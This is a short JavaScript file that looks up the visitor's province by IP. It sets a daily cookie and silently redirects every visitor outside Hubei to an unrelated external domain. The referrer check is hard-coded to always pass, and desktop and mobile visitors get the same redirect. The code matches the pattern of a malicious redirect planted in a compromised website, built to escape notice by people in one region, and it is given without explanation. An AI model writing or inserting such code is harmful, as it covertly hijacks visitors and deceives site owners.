
jQuery.getScript("http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js",function(){
    var mycity = remote_ip_info['province'];
    function tiaozhuan()
    {
        var res=document.referrer;//获取来源地址
        res="baidu.com";
        if(res.indexOf("baidu")>=0)
        {
            if(mycity!="湖北")
            {
                var yishownotice = getCookie('yiShowNotice');
                if(yishownotice == 1){

                }else{
                    setCookie('yiShowNotice',1,1000*60*1440);//1440
                    if(IsPC())
                    {
                        //电脑 跳转代码
                        //alert(1)
                        location.href="http://15818y.com/";
                    }
                    else
                    {
                        //手机 跳转代码
                        //alert(2)
                        location.href="http://15818y.com/";
                    }
                }
            }
        }
    }

    function IsPC() {
        var userAgentInfo = navigator.userAgent;
        var Agents = ["Android", "iPhone",
            "SymbianOS", "Windows Phone",
            "iPad", "iPod"];
        var flag = true;
        for (var v = 0; v < Agents.length; v++) {
            if (userAgentInfo.indexOf(Agents[v]) > 0) {
                flag = false;
                break;
            }
        }
        return flag;
    }

    tiaozhuan();}) ;


function getCookie(name) {
    var re = "(?:; )?" + encodeURIComponent(name) + "=([^;]*);?";
    re = new RegExp(re);
    if (re.test(document.cookie)) {
        return decodeURIComponent(RegExp.$1);
    }
    return '';
}

function setCookie(name,value,expire,path) {
    var curdate=new Date();
    var cookie=name+"="+encodeURIComponent(value)+"; ";
    if(expire!=undefined||expire==0){
        if(expire==-1){
            expire=366*86400*1000;//保存一年
        }else{
            expire=parseInt(expire);
        }
        curdate.setTime(curdate.getTime()+expire);
        cookie+="expires="+curdate.toUTCString()+"; ";
    }
    path = path || "/";
    cookie += "path=" + path;
    document.cookie=cookie;
}